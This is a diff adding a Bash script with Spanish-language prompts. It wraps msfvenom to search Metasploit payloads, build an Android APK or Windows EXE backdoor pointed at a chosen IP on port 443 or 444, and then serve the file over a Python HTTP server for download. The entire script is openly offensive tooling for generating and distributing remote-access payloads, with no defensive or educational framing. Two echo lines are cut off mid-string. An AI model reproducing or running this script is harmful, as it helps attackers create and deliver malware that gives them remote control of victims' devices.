@@ -1,0 +1,59 @@
+#!/bin/bash 
+opciones=0
+menu(){
+echo "1. android"
+echo "2.windows"
+}
+android(){ 
+echo -e "\e[0;34mPARA UTILIZAR MI SCRIPT
+Hay que saber que solo se puede utilizar con payloads de Android.
+También que cuando le pongas el nombre a un archivo no hay que poner el
+ .apk sino simplemente el nombre.
+Por favor las ips tienen que ser válidas de lo contrario saldrá un mensaje de error.
+A la hora de buscar los payloads en la parte derecha podrás ver para que sirve casa uno.
+Una vez se ejecute el comando para crear tu archivo .apk se lanzará un
+ servidor http y simplemente tendrás que poner tu ip en un navegador como
+ duckduckgo y podrás acceder a tus archivos\e[0"
+echo -e "\e[1;31mque payload quieres buscar, android\e[0m"
+read payl
+payl=$payl
+msfvenom -l payload | grep $payl
+echo -e "\e[1;31mque payload quieres utilizar, android\e[0m"
+read pay
+echo -e "\e[1;31mque nombre le quieres poner a tu archivo\e[0m"
+read nombre
+echo -e "\e[1;31mcual es tu ip\e[0m"
+read ip
+ip=$ip
+nombre=$nombre
+pay=$pay
+
+msfvenom -p $pay LHOST=$ip LPORT=443 -o $nombre.apk && python3 -m http.server 80 || echo -e "\e[0;32mparece q>
+}
+ windows(){
+echo "que payload quiers buscar, windows"
+read payload
+payload=$payload
+msfvenom -l payloads | grep $payload
+echo "que payload quieres utilizar, windows"
+read pay
+echo "cual es tu ip"
+read ip
+echo "que nombre le quieres poner a tu archivo, sin la extension"
+read nom
+pay=$pay
+ip=$ip
+nom=$nom
+msfvenom -p $pay LHOST=$ip LPORT=444 -f exe -o $nom.exe && python3 -m http.server 80 || echo "creo que hay al>
+}
+while true; do
+menu
+echo "que payload quieres crear"
+read pay
+pay=$pay
+case $pay in
+1) android ;;
+2) windows ;;
+*) echo "creo que algo no coincide" ;;
+esac 
+done
